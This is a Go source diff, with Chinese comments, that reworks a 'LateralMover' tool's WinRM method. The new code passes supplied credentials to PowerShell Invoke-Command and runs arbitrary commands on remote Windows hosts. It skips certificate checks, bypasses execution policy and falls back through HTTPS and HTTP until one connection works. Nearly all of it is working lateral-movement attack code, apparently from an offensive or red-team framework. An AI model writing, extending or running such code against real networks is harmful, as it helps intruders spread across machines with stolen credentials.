@@ -52,6 +52,7 @@ func (lm *LateralMover) moveViaWMI(req MoveRequest) MoveResult {
 }
 
 // moveViaWinRM 通过 WinRM 执行横向移动
+// 利用 SYSTEM 权限配置客户端，支持加密和非加密连接
 func (lm *LateralMover) moveViaWinRM(req MoveRequest) MoveResult {
 	result := MoveResult{
 		Method: MethodWinRM,
@@ -67,29 +68,83 @@ func (lm *LateralMover) moveViaWinRM(req MoveRequest) MoveResult {
 	targetAddr := getTargetAddress(req.Target)
 	credStr := buildCredString(req.Credentials)
 
-	// 使用 Basic 认证和允许未加密连接
+	// 使用默认配置，尝试多种 WinRM 连接方式
 	psScript := fmt.Sprintf(`
 		[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-		$pass = ConvertTo-SecureString "%s" -AsPlainText -Force;
-		$cred = New-Object System.Management.Automation.PSCredential("%s", $pass);
-		$option = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck;
 		
-		# 方法1: 尝试基本认证
+		# 准备凭据
+		$pass = ConvertTo-SecureString "%s" -AsPlainText -Force
+		$cred = New-Object System.Management.Automation.PSCredential("%s", $pass)
+		$option = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+		
+		# 执行远程命令
+		$success = $false
+		$output = ""
+		$lastError = ""
+		
+		# 尝试1: HTTPS (端口 5986) - 最安全
 		try {
-			Invoke-Command -ComputerName %s -Credential $cred -Authentication Basic -SessionOption $option -ScriptBlock { %s }
+			Write-Output "[尝试1] HTTPS 连接 (端口 5986)..."
+			$output = Invoke-Command -ComputerName %s -Credential $cred -UseSSL -SessionOption $option -ScriptBlock { %s } -ErrorAction Stop 2>&1 | Out-String
+			$success = $true
+			Write-Output "[成功] HTTPS 连接成功"
 		} catch {
-			# 方法2: 尝试使用 Enter-PSSession 方式
+			$lastError = "HTTPS失败: $($_.Exception.Message)"
+			Write-Output "[失败] $lastError"
+		}
+		
+		# 尝试2: HTTPS URI 明确指定
+		if (-not $success) {
 			try {
-				$session = New-PSSession -ComputerName %s -Credential $cred -Authentication Basic -SessionOption $option
-				Invoke-Command -Session $session -ScriptBlock { %s }
-				Remove-PSSession $session
+				Write-Output "[尝试2] HTTPS URI 连接 (https://%s:5986/wsman)..."
+				$uri = "https://%s:5986/wsman"
+				$output = Invoke-Command -ConnectionUri $uri -Credential $cred -SessionOption $option -ScriptBlock { %s } -ErrorAction Stop 2>&1 | Out-String
+				$success = $true
+				Write-Output "[成功] HTTPS URI 连接成功"
 			} catch {
-				# 方法3: 直接使用 wmic 远程执行（备用）
-				Write-Output "WinRM failed, command not executed: %s"
-				throw $_.Exception
+				$lastError = "HTTPS URI失败: $($_.Exception.Message)"
+				Write-Output "[失败] $lastError"
 			}
 		}
-	`, req.Credentials.Password, credStr, targetAddr, req.Command, targetAddr, req.Command, req.Command)
+		
+		# 尝试3: HTTP (端口 5985) - 默认
+		if (-not $success) {
+			try {
+				Write-Output "[尝试3] HTTP 连接 (默认端口 5985)..."
+				$output = Invoke-Command -ComputerName %s -Credential $cred -SessionOption $option -ScriptBlock { %s } -ErrorAction Stop 2>&1 | Out-String
+				$success = $true
+				Write-Output "[成功] HTTP 连接成功"
+			} catch {
+				$lastError = "HTTP失败: $($_.Exception.Message)"
+				Write-Output "[失败] $lastError"
+			}
+		}
+		
+		# 尝试4: HTTP URI 明确指定
+		if (-not $success) {
+			try {
+				Write-Output "[尝试4] HTTP URI 连接 (http://%s:5985/wsman)..."
+				$uri = "http://%s:5985/wsman"
+				$output = Invoke-Command -ConnectionUri $uri -Credential $cred -SessionOption $option -ScriptBlock { %s } -ErrorAction Stop 2>&1 | Out-String
+				$success = $true
+				Write-Output "[成功] HTTP URI 连接成功"
+			} catch {
+				$lastError = "HTTP URI失败: $($_.Exception.Message)"
+				Write-Output "[失败] $lastError"
+			}
+		}
+		
+		# 输出结果
+		if ($success) {
+			$output
+		} else {
+			throw "所有连接方式均失败: $lastError"
+		}
+	`, req.Credentials.Password, credStr,
+		targetAddr, req.Command,
+		targetAddr, targetAddr, req.Command,
+		targetAddr, req.Command,
+		targetAddr, targetAddr, req.Command)
 
 	args := []string{
 		"-ExecutionPolicy", "Bypass",
